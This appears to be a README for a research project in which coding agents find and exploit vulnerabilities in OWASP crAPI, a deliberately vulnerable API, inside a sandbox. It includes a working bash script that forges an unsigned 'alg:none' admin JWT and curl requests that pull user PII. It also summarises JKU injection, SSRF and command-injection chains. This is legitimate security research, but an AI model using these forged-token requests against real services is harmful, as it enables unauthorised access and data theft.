# Coding agents that find *and prove* API vulnerabilities

I gave a coding agent OWASP crAPI's source tree and a sandboxed HTTP
toolkit. It found **13 vulnerabilities covering all 10 OWASP API Top 10
categories**, generated the exploits, ran them against the live target,
and returned a structured verdict for each one — **including saying "I
don't know" when it couldn't actually prove a bug**.

> **13 findings** · **10 / 10 OWASP API categories** · **4 microservices**
> (Java + Python + Go) · **11 CONFIRMED, 1 FAILED, 1 UNCLEAR** · **≈ $2**
> in API costs · **26 attack-chain reports** in [`docs/sample-reports/`](docs/sample-reports/)

This is a research PoC, not a production scanner. The point is to show
what's actually realistic today when an agent gets to reason about source
**and** execute HTTP requests end-to-end against a live target.

---

## A real attack chain — `alg:none` JWT, accepted by every service

<details>
<summary><b>F-02 · The agent removed the signature from a JWT and the server authenticated it as admin across all three microservices.</b> Click to expand.</summary>

> **Hypothesis (from the hunter):** `validateJwtToken()` calls
> `SignedJWT.parse()` which throws `ParseException` on unsigned (`alg:none`)
> JWTs. The catch block silently calls `PlainJWT.parse()` and **returns
> `true` unconditionally**. Workshop and community services validate by
> proxying to `/identity/api/auth/verify` — same flaw, propagates everywhere.

The exploiter's actual commands:

```bash
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD='{"sub":"admin@example.com","role":"admin","iat":9999999999,"exp":9999999999}'
B64H=$(echo -n "$HEADER"  | base64 -w0 | tr '+/' '-_' | tr -d '=')
B64P=$(echo -n "$PAYLOAD" | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${B64H}.${B64P}."          # ← empty signature

curl -H "Authorization: Bearer $FORGED" \
     "$TARGET_URL/identity/api/v2/vehicle/vehicles"        # 200 — vehicles + VINs
curl -H "Authorization: Bearer $FORGED" \
     "$TARGET_URL/workshop/api/management/users/all"       # 200 — all users + PII
curl -H "Authorization: Bearer $FORGED" \
     "$TARGET_URL/community/api/v2/community/posts/recent" # 200 — community posts
```

Verdict: **CONFIRMED**. Cost: $0.0174. Root cause pinpointed at
`JwtProvider.java:197-200`. Without any token, all three endpoints return
401 — proving the forged token is what authenticated the request.

Full report with reasoning and HTTP evidence: [`docs/sample-reports/opencode/F-02.md`](docs/sample-reports/opencode/F-02.md)

</details>

---

## Why this PoC is different from "AI scans your code"

**Three roles, separation of powers — not "an AI that scans".** The
pipeline is three independent agent invocations: a *Surveyor* that maps
the attack surface but is **forbidden from naming vulnerabilities** (so it
doesn't anchor on what it already knows), a *Hunter* that emits operational
findings with concrete attack requests, and an *Exploiter* that runs each
finding in its own process. Each phase has a different tool surface.

**It actually executes the exploit and checks the response.** Source →
hypothesis → exploit generated → HTTP request against a live target →
compare response with the predicted signal → verdict with evidence. Most
"AI + security" demos stop at the description. This one stops at "here's
the 200 OK that proves it".

**`UNCLEAR` is a first-class verdict.** F-13 (command injection) came
back UNCLEAR because the bug requires `ENABLE_SHELL_INJECTION=true` and
the agent could not confirm whether that flag was set. **That is the
correct answer.** A scanner that admits uncertainty is more useful than
one that's confidently wrong.

**Brain on host, hands in a sealed sandbox.** The LLM can read any file
and reason freely; everything it executes goes through a Podman container
with read-only rootfs, read-only source mount, and a 200 MB tmpfs scratch
that's wiped on exit. Add a tool to the Dockerfile + a recipe to a
markdown manifest, and the agent picks it up next run with **zero prompt
change**.

**Same sandbox, multiple coding-agent strategies.** Identical Dockerfile,
identical MCP bridge, identical system prompts — swap only the
coding-agent CLI. Today: **opencode + DeepSeek-V4-Pro** and **Claude
Code**. The 26 reports in `docs/sample-reports/` are two real runs against
crAPI — apples-to-apples.

---

## How it works in 60 seconds

```
   ┌─────────────┐     ┌────────────┐     ┌──────────────────────┐
   │  Surveyor   │ ──▶ │   Hunter   │ ──▶ │  Exploiter (×N)      │
   │ source-only │     │ source +   │     │ source + sandbox     │
   │ no naming   │     │ sandbox    │     │ one process /finding │
   └──────┬──────┘     └─────┬──────┘     └──────────┬───────────┘
          ▼                  ▼                       ▼
      survey.json       findings.json          verdicts/<id>.json
```

```
   ┌─────────────────────────────┐
   │  Coding agent on host       │  ← brain: LLM, file reads, prompt assembly
   └────────────────┬────────────┘
                    │ MCP bash tool (JSON-RPC stdio)
                    ▼
   ┌─────────────────────────────┐
   │  apisec-sandbox container   │  ← hands: read-only rootfs, tmpfs scratch,
   │  podman exec bash -lc "..."  │    project source mounted RO
   └────────────────┬────────────┘
                    │ HTTP
                    ▼
   ┌─────────────────────────────┐
   │  Target API (crAPI)         │
   └─────────────────────────────┘
```

Full architecture write-up: [`docs/architecture.md`](docs/architecture.md).

---

## All 13 findings — click any row for the full attack chain

| ID | OWASP | Severity | What | Verdict | Report |
|----|-------|----------|------|---------|--------|
| F-01 | API1 | Critical | BOLA: any auth'd user reads any vehicle's GPS + owner PII | CONFIRMED | [opencode](docs/sample-reports/opencode/F-01.md) · [claude](docs/sample-reports/claude/F-01.md) |
| F-02 | API2 | Critical | `alg:none` JWT accepted across all services | CONFIRMED | [opencode](docs/sample-reports/opencode/F-02.md) · [claude](docs/sample-reports/claude/F-02.md) |
| F-03 | API2 | Critical | JKU header injection — server fetches attacker JWKS | CONFIRMED | [opencode](docs/sample-reports/opencode/F-03.md) · [claude](docs/sample-reports/claude/F-03.md) |
| F-04 | API2 | High | HS256-with-RSA-public-key algorithm confusion | FAILED | [opencode](docs/sample-reports/opencode/F-04.md) · [claude](docs/sample-reports/claude/F-04.md) |
| F-05 | API3 | High | Mass user-PII exposure on admin endpoint, no role check | CONFIRMED | [opencode](docs/sample-reports/opencode/F-05.md) · [claude](docs/sample-reports/claude/F-05.md) |
| F-06 | API5 | High | BFLA — admin video deletion reachable by any user | CONFIRMED | [opencode](docs/sample-reports/opencode/F-06.md) · [claude](docs/sample-reports/claude/F-06.md) |
| F-07 | API4 | High | No rate limit on v2 OTP — 10k-combo brute-force | CONFIRMED | [opencode](docs/sample-reports/opencode/F-07.md) · [claude](docs/sample-reports/claude/F-07.md) |
| F-08 | API6 | High | All seeded vehicles share PIN `123456` → claim any car | CONFIRMED | [opencode](docs/sample-reports/opencode/F-08.md) · [claude](docs/sample-reports/claude/F-08.md) |
| F-09 | API7 | High | SSRF in `contact_mechanic` — outbound HTTP to attacker URL | CONFIRMED | [opencode](docs/sample-reports/opencode/F-09.md) · [claude](docs/sample-reports/claude/F-09.md) |
| F-10 | API8 | High | Multiple unauth'd endpoints leak PII / payment / DoS reset | CONFIRMED | [opencode](docs/sample-reports/opencode/F-10.md) · [claude](docs/sample-reports/claude/F-10.md) |
| F-11 | API8 | High | Hardcoded gateway Basic Auth creds in source | CONFIRMED | [opencode](docs/sample-reports/opencode/F-11.md) · [claude](docs/sample-reports/claude/F-11.md) |
| F-12 | API9 | Medium | Deprecated insecure v2 OTP coexists with secure v3 | CONFIRMED | [opencode](docs/sample-reports/opencode/F-12.md) · [claude](docs/sample-reports/claude/F-12.md) |
| F-13 | API10 | Critical | Mass-assign → SSRF → OS command injection chain | UNCLEAR | [opencode](docs/sample-reports/opencode/F-13.md) · [claude](docs/sample-reports/claude/F-13.md) |

The three I'd start with if you only have time for three:

- **F-08** — every seeded car uses PIN `123456`. Combined with F-01's BOLA
  that leaks VINs, the agent can claim ownership of any vehicle.
- **F-03** — the JWT header tells the server *where to fetch the key from*.
  The agent points it at its own JWKS, signs with its own key, gets in.
- **F-13** — three findings chained: mass-assign to write
  `conversion_params` to your video, F-09's SSRF to bypass the proxy guard,
  RCE inside `crapi-identity`. Came back **UNCLEAR** because the agent
  couldn't confirm `ENABLE_SHELL_INJECTION=true` — and *said so*.

---

## Quickstart

```bash
# 1. Bring up the target
git clone https://github.com/OWASP/crAPI.git
podman compose -f crAPI/deploy/docker/docker-compose.yml up -d

# 2. Pick a strategy
opencode/run.sh --target-url http://localhost:8888 --workspace ./crAPI --model deepseek/deepseek-v4-pro
# or
claude/run.sh   --target-url http://localhost:8888 --workspace ./crAPI --model claude-sonnet-4-6
```

Outputs land in `findings/<strategy>-runs/<timestamp>/`. Full setup
including DeepSeek provider config: [`docs/setup.md`](docs/setup.md).

---

## Repository layout

```
docker/apisec-runner/        SHARED — sandbox image + TOOLS.md cookbook
opencode/                    opencode + DeepSeek strategy
claude/                      Claude Code strategy
lib/build-report.py          stream → markdown attack-chain report
docs/                        architecture, strategies, setup, troubleshooting
docs/sample-reports/         26 real reports (13 findings × 2 strategies)
findings/                    runtime outputs (gitignored)
```

## Documentation

- [`docs/architecture.md`](docs/architecture.md) — three-phase pipeline,
  sandbox model, MCP bridge, `TOOLS.md` cookbook, why each piece exists
- [`docs/strategies.md`](docs/strategies.md) — opencode vs Claude Code
  side-by-side, contract for adding a new coding-agent strategy
- [`docs/setup.md`](docs/setup.md) — requirements, target deployment,
  DeepSeek config, watching live progress
- [`docs/troubleshooting.md`](docs/troubleshooting.md) — outputs schema,
  verdict format, operational fields, common failure modes
- [`docs/sample-reports/`](docs/sample-reports/) — 26 attack-chain
  reports from real runs against crAPI, JWTs redacted, ready to read
